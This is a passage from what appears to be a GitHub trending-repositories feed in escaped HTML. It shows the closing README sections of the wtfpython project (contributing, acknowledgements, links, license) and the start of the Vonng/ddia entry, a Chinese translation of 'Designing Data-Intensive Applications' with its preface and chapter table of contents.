&#xA;&lt;hr&gt; &#xA;&lt;hr&gt; &#xA;&lt;h1&gt;Contributing&lt;/h1&gt; &#xA;&lt;p&gt;A few ways in which you can contribute to wtfpython,&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Suggesting new examples&lt;/li&gt; &#xA; &lt;li&gt;Helping with translation (See &lt;a href=&#34;https://github.com/satwikkansal/wtfpython/issues?q=is%3Aissue+is%3Aopen+label%3Atranslation&#34;&gt;issues labeled translation&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Minor corrections like pointing out outdated snippets, typos, formatting errors, etc.&lt;/li&gt; &#xA; &lt;li&gt;Identifying gaps (things like inadequate explanation, redundant examples, etc.)&lt;/li&gt; &#xA; &lt;li&gt;Any creative suggestions to make this project more fun and useful&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Please see &lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/CONTRIBUTING.md&#34;&gt;CONTRIBUTING.md&lt;/a&gt; for more details. Feel free to create a new &lt;a href=&#34;https://github.com/satwikkansal/wtfpython/issues/new&#34;&gt;issue&lt;/a&gt; to discuss things.&lt;/p&gt; &#xA;&lt;p&gt;PS: Please don&#39;t reach out with backlinking requests, no links will be added unless they&#39;re highly relevant to the project.&lt;/p&gt; &#xA;&lt;h1&gt;Acknowledgements&lt;/h1&gt; &#xA;&lt;p&gt;The idea and design for this collection were initially inspired by Denys Dovhan&#39;s awesome project &lt;a href=&#34;https://github.com/denysdovhan/wtfjs&#34;&gt;wtfjs&lt;/a&gt;. The overwhelming support by Pythonistas gave it the shape it is in right now.&lt;/p&gt; &#xA;&lt;h4&gt;Some nice Links!&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=sH4XF6pKKmk&#34;&gt;https://www.youtube.com/watch?v=sH4XF6pKKmk&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.reddit.com/r/Python/comments/3cu6ej/what_are_some_wtf_things_about_python&#34;&gt;https://www.reddit.com/r/Python/comments/3cu6ej/what_are_some_wtf_things_about_python&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://sopython.com/wiki/Common_Gotchas_In_Python&#34;&gt;https://sopython.com/wiki/Common_Gotchas_In_Python&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://stackoverflow.com/questions/530530/python-2-x-gotchas-and-landmines&#34;&gt;https://stackoverflow.com/questions/530530/python-2-x-gotchas-and-landmines&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://stackoverflow.com/questions/1011431/common-pitfalls-in-python&#34;&gt;https://stackoverflow.com/questions/1011431/common-pitfalls-in-python&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.python.org/doc/humor/&#34;&gt;https://www.python.org/doc/humor/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/cosmologicon/pywat#the-undocumented-converse-implication-operator&#34;&gt;https://github.com/cosmologicon/pywat#the-undocumented-converse-implication-operator&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.codementor.io/satwikkansal/python-practices-for-efficient-code-performance-memory-and-usability-aze6oiq65&#34;&gt;https://www.codementor.io/satwikkansal/python-practices-for-efficient-code-performance-memory-and-usability-aze6oiq65&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/wemake-services/wemake-python-styleguide/search?q=wtfpython&amp;amp;type=Issues&#34;&gt;https://github.com/wemake-services/wemake-python-styleguide/search?q=wtfpython&amp;amp;type=Issues&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;WFTPython discussion threads on &lt;a href=&#34;https://news.ycombinator.com/item?id=21862073&#34;&gt;Hacker News&lt;/a&gt; and &lt;a href=&#34;https://www.reddit.com/r/programming/comments/edsh3q/what_the_fck_python_30_exploring_and/&#34;&gt;Reddit&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;🎓 License&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://www.wtfpl.net&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/License-WTFPL%202.0-lightgrey.svg?style=flat-square&#34; alt=&#34;WTFPL 2.0&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;© &lt;a href=&#34;https://satwikkansal.xyz&#34;&gt;Satwik Kansal&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Surprise your friends as well!&lt;/h2&gt; &#xA;&lt;p&gt;If you like wtfpython, you can use these quick links to share it with your friends,&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://twitter.com/intent/tweet?url=https://github.com/satwikkansal/wtfpython&amp;amp;text=If%20you%20really%20think%20you%20know%20Python,%20think%20once%20more!%20Check%20out%20wtfpython&amp;amp;hashtags=python,wtfpython&#34;&gt;Twitter&lt;/a&gt; | &lt;a href=&#34;https://www.linkedin.com/shareArticle?url=https://github.com/satwikkansal&amp;amp;title=What%20the%20f*ck%20Python!&amp;amp;summary=If%20you%20really%20thing%20you%20know%20Python,%20think%20once%20more!&#34;&gt;Linkedin&lt;/a&gt; | &lt;a href=&#34;https://www.facebook.com/dialog/share?app_id=536779657179021&amp;amp;display=page&amp;amp;href=https%3A%2F%2Fgithub.com%2Fsatwikkansal%2Fwtfpython&amp;amp;quote=If%20you%20really%20think%20you%20know%20Python%2C%20think%20once%20more!&#34;&gt;Facebook&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Need a pdf version?&lt;/h2&gt; &#xA;&lt;p&gt;I&#39;ve received a few requests for the pdf (and epub) version of wtfpython. You can add your details &lt;a href=&#34;https://satwikkansal.xyz/wtfpython-pdf/&#34;&gt;here&lt;/a&gt; to get them as soon as they are finished.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;That&#39;s all folks!&lt;/strong&gt; For upcoming content like this, you can add your email &lt;a href=&#34;https://www.satwikkansal.xyz/content-like-wtfpython/&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>Vonng/ddia</title>
    <updated>2022-06-02T01:32:44Z</updated>
    <id>tag:github.com,2022-06-02:/Vonng/ddia</id>
    <link href="https://github.com/Vonng/ddia" rel="alternate"></link>
    <summary type="html">&lt;p&gt;《Designing Data-Intensive Application》DDIA中文翻译&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;设计数据密集型应用 - 中文翻译&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;作者： &lt;a href=&#34;https://martin.kleppmann.com&#34;&gt;Martin Kleppmann&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;原名：&lt;a href=&#34;http://shop.oreilly.com/product/0636920032175.do&#34;&gt;《Designing Data-Intensive Applications》&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;译者：&lt;a href=&#34;https://vonng.com&#34;&gt;冯若航&lt;/a&gt; （&lt;a href=&#34;https://vonng.com/en/&#34;&gt;@Vonng&lt;/a&gt;）&lt;/li&gt; &#xA; &lt;li&gt;校订： &lt;a href=&#34;https://github.com/yingang&#34;&gt;@yingang&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;繁体：&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/zh-tw/README.md&#34;&gt;繁體中文版本&lt;/a&gt; by &lt;a href=&#34;https://github.com/afunTW&#34;&gt;@afunTW&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;使用 &lt;a href=&#34;https://www.typora.io&#34;&gt;Typora&lt;/a&gt;、&lt;a href=&#34;https://vonng.gitbook.io/vonng/&#34;&gt;Gitbook&lt;/a&gt; 或 &lt;a href=&#34;https://vonng.github.io/ddia&#34;&gt;Github Pages&lt;/a&gt; 以获取最佳阅读体验。&lt;/p&gt; &#xA; &lt;p&gt;本地：你可在项目根目录中执行 &lt;code&gt;make&lt;/code&gt;，并通过浏览器阅读（&lt;a href=&#34;http://ddia.vonng.com/#/&#34;&gt;在线预览&lt;/a&gt;）。&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;译序&lt;/h2&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;不懂数据库的全栈工程师不是好架构师&lt;/p&gt; &#xA; &lt;p&gt;—— Vonng&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;现今，尤其是在互联网领域，大多数应用都属于数据密集型应用。本书从底层数据结构到顶层架构设计，将数据系统设计中的精髓娓娓道来。其中的宝贵经验无论是对架构师、DBA、还是后端工程师、甚至产品经理都会有帮助。&lt;/p&gt; &#xA;&lt;p&gt;这是一本理论结合实践的书，书中很多问题，译者在实际场景中都曾遇到过，读来让人击节扼腕。如果能早点读到这本书，该少走多少弯路啊！&lt;/p&gt; &#xA;&lt;p&gt;这也是一本深入浅出的书，讲述概念的来龙去脉而不是卖弄定义，介绍事物发展演化历程而不是事实堆砌，将复杂的概念讲述的浅显易懂，但又直击本质不失深度。每章最后的引用质量非常好，是深入学习各个主题的绝佳索引。&lt;/p&gt; &#xA;&lt;p&gt;本书为数据系统的设计、实现、与评价提供了很好的概念框架。读完并理解本书内容后，读者可以轻松看破大多数的技术忽悠，与技术砖家撕起来虎虎生风🤣。&lt;/p&gt; &#xA;&lt;p&gt;这是 2017 年译者读过最好的一本技术类书籍，这么好的书没有中文翻译，实在是遗憾。某不才，愿为先进技术文化的传播贡献一份力量。既可以深入学习有趣的技术主题，又可以锻炼中英文语言文字功底，何乐而不为？&lt;/p&gt; &#xA;&lt;h2&gt;前言&lt;/h2&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;在我们的社会中，技术是一种强大的力量。数据、软件、通信可以用于坏的方面：不公平的阶级固化，损害公民权利，保护既得利益集团。但也可以用于好的方面：让底层人民发出自己的声音，让每个人都拥有机会，避免灾难。本书献给所有将技术用于善途的人们。&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;hr&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;计算是一种流行文化，流行文化鄙视历史。 流行文化关乎个体身份和参与感，但与合作无关。流行文化活在当下，也与过去和未来无关。 我认为大部分（为了钱）编写代码的人就是这样的， 他们不知道自己的文化来自哪里。&lt;/p&gt; &#xA; &lt;p&gt;—— 阿兰・凯接受 Dobb 博士的杂志采访时（2012 年）&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;目录&lt;/h2&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/preface.md&#34;&gt;序言&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/part-i.md&#34;&gt;第一部分：数据系统基础&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch1.md&#34;&gt;第一章：可靠性、可伸缩性和可维护性&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch1.md#%E5%85%B3%E4%BA%8E%E6%95%B0%E6%8D%AE%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%80%9D%E8%80%83&#34;&gt;关于数据系统的思考&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch1.md#%E5%8F%AF%E9%9D%A0%E6%80%A7&#34;&gt;可靠性&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch1.md#%E5%8F%AF%E4%BC%B8%E7%BC%A9%E6%80%A7&#34;&gt;可伸缩性&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch1.md#%E5%8F%AF%E7%BB%B4%E6%8A%A4%E6%80%A7&#34;&gt;可维护性&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch1.md#%E6%9C%AC%E7%AB%A0%E5%B0%8F%E7%BB%93&#34;&gt;本章小结&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch2.md&#34;&gt;第二章：数据模型与查询语言&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch2.md#%E5%85%B3%E7%B3%BB%E6%A8%A1%E5%9E%8B%E4%B8%8E%E6%96%87%E6%A1%A3%E6%A8%A1%E5%9E%8B&#34;&gt;关系模型与文档模型&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch2.md#%E6%95%B0%E6%8D%AE%E6%9F%A5%E8%AF%A2%E8%AF%AD%E8%A8%80&#34;&gt;数据查询语言&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch2.md#%E5%9B%BE%E6%95%B0%E6%8D%AE%E6%A8%A1%E5%9E%8B&#34;&gt;图数据模型&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch2.md#%E6%9C%AC%E7%AB%A0%E5%B0%8F%E7%BB%93&#34;&gt;本章小结&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch3.md&#34;&gt;第三章：存储与检索&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch3.md#%E9%A9%B1%E5%8A%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84&#34;&gt;驱动数据库的数据结构&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch3.md#%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E8%BF%98%E6%98%AF%E5%88%86%E6%9E%90%EF%BC%9F&#34;&gt;事务处理还是分析？&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch3.md#%E5%88%97%E5%BC%8F%E5%AD%98%E5%82%A8&#34;&gt;列式存储&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch3.md#%E6%9C%AC%E7%AB%A0%E5%B0%8F%E7%BB%93&#34;&gt;本章小结&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch4.md&#34;&gt;第四章：编码与演化&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch4.md#%E7%BC%96%E7%A0%81%E6%95%B0%E6%8D%AE%E7%9A%84%E6%A0%BC%E5%BC%8F&#34;&gt;编码数据的格式&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch4.md#%E6%95%B0%E6%8D%AE%E6%B5%81%E7%9A%84%E7%B1%BB%E5%9E%8B&#34;&gt;数据流的类型&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch4.md#%E6%9C%AC%E7%AB%A0%E5%B0%8F%E7%BB%93&#34;&gt;本章小结&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/part-ii.md&#34;&gt;第二部分：分布式数据&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch5.md&#34;&gt;第五章：复制&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch5.md#%E9%A2%86%E5%AF%BC%E8%80%85%E4%B8%8E%E8%BF%BD%E9%9A%8F%E8%80%85&#34;&gt;领导者与追随者&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch5.md#%E5%A4%8D%E5%88%B6%E5%BB%B6%E8%BF%9F%E9%97%AE%E9%A2%98&#34;&gt;复制延迟问题&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch5.md#%E5%A4%9A%E4%B8%BB%E5%A4%8D%E5%88%B6&#34;&gt;多主复制&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch5.md#%E6%97%A0%E4%B8%BB%E5%A4%8D%E5%88%B6&#34;&gt;无主复制&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch5.md#%E6%9C%AC%E7%AB%A0%E5%B0%8F%E7%BB%93&#34;&gt;本章小结&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch6.md&#34;&gt;第六章：分区&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch6.md#%E5%88%86%E5%8C%BA%E4%B8%8E%E5%A4%8D%E5%88%B6&#34;&gt;分区与复制&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch6.md#%E9%94%AE%E5%80%BC%E6%95%B0%E6%8D%AE%E7%9A%84%E5%88%86%E5%8C%BA&#34;&gt;键值数据的分区&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch6.md#%E5%88%86%E5%8C%BA%E4%B8%8E%E6%AC%A1%E7%BA%A7%E7%B4%A2%E5%BC%95&#34;&gt;分区与次级索引&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch6.md#%E5%88%86%E5%8C%BA%E5%86%8D%E5%B9%B3%E8%A1%A1&#34;&gt;分区再平衡&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch6.md#%E8%AF%B7%E6%B1%82%E8%B7%AF%E7%94%B1&#34;&gt;请求路由&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch6.md#%E6%9C%AC%E7%AB%A0%E5%B0%8F%E7%BB%93&#34;&gt;本章小结&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch7.md&#34;&gt;第七章：事务&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch7.md#%E4%BA%8B%E5%8A%A1%E7%9A%84%E6%A3%98%E6%89%8B%E6%A6%82%E5%BF%B5&#34;&gt;事务的棘手概念&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch7.md#%E5%BC%B1%E9%9A%94%E7%A6%BB%E7%BA%A7%E5%88%AB&#34;&gt;弱隔离级别&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch7.md#%E5%8F%AF%E4%B8%B2%E8%A1%8C%E5%8C%96&#34;&gt;可串行化&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch7.md#%E6%9C%AC%E7%AB%A0%E5%B0%8F%E7%BB%93&#34;&gt;本章小结&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch8.md&#34;&gt;第八章：分布式系统的麻烦&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch8.md#%E6%95%85%E9%9A%9C%E4%B8%8E%E9%83%A8%E5%88%86%E5%A4%B1%E6%95%88&#34;&gt;故障与部分失效&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch8.md#%E4%B8%8D%E5%8F%AF%E9%9D%A0%E7%9A%84%E7%BD%91%E7%BB%9C&#34;&gt;不可靠的网络&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch8.md#%E4%B8%8D%E5%8F%AF%E9%9D%A0%E7%9A%84%E6%97%B6%E9%92%9F&#34;&gt;不可靠的时钟&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch8.md#%E7%9F%A5%E8%AF%86%E3%80%81%E7%9C%9F%E7%9B%B8%E4%B8%8E%E8%B0%8E%E8%A8%80&#34;&gt;知识、真相与谎言&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch8.md#%E6%9C%AC%E7%AB%A0%E5%B0%8F%E7%BB%93&#34;&gt;本章小结&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch9.md&#34;&gt;第九章：一致性与共识&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch9.md#%E4%B8%80%E8%87%B4%E6%80%A7%E4%BF%9D%E8%AF%81&#34;&gt;一致性保证&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch9.md#%E7%BA%BF%E6%80%A7%E4%B8%80%E8%87%B4%E6%80%A7&#34;&gt;线性一致性&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch9.md#%E9%A1%BA%E5%BA%8F%E4%BF%9D%E8%AF%81&#34;&gt;顺序保证&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch9.md#%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1%E4%B8%8E%E5%85%B1%E8%AF%86&#34;&gt;分布式事务与共识&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch9.md#%E6%9C%AC%E7%AB%A0%E5%B0%8F%E7%BB%93&#34;&gt;本章小结&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/part-iii.md&#34;&gt;第三部分：衍生数据&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch10.md&#34;&gt;第十章：批处理&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch10.md#%E4%BD%BF%E7%94%A8Unix%E5%B7%A5%E5%85%B7%E7%9A%84%E6%89%B9%E5%A4%84%E7%90%86&#34;&gt;使用Unix工具的批处理&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch10.md#MapReduce%E5%92%8C%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F&#34;&gt;MapReduce和分布式文件系统&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch10.md#MapReduce%E4%B9%8B%E5%90%8E&#34;&gt;MapReduce之后&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch10.md#%E6%9C%AC%E7%AB%A0%E5%B0%8F%E7%BB%93&#34;&gt;本章小结&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch11.md&#34;&gt;第十一章：流处理&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch11.md#%E4%BC%A0%E9%80%92%E4%BA%8B%E4%BB%B6%E6%B5%81&#34;&gt;传递事件流&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch11.md#%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8E%E6%B5%81&#34;&gt;数据库与流&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch11.md#%E6%B5%81%E5%A4%84%E7%90%86&#34;&gt;流处理&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch11.md#%E6%9C%AC%E7%AB%A0%E5%B0%8F%E7%BB%93&#34;&gt;本章小结&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch12.md&#34;&gt;第十二章：数据系统的未来&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch12.md#%E6%95%B0%E6%8D%AE%E9%9B%86%E6%88%90&#34;&gt;数据集成&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch12.md#%E5%88%86%E6%8B%86%E6%95%B0%E6%8D%AE%E5%BA%93&#34;&gt;分拆数据库&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch12.md#%E5%B0%86%E4%BA%8B%E6%83%85%E5%81%9A%E6%AD%A3%E7%A1%AE&#34;&gt;将事情做正确&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch12.md#%E5%81%9A%E6%AD%A3%E7%A1%AE%E7%9A%84%E4%BA%8B%E6%83%85&#34;&gt;做正确的事情&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch12.md#%E6%9C%AC%E7%AB%A0%E5%B0%8F%E7%BB%93&#34;&gt;本章小结&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/glossary.md&#34;&gt;术语表&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;h3&gt;&lt;a 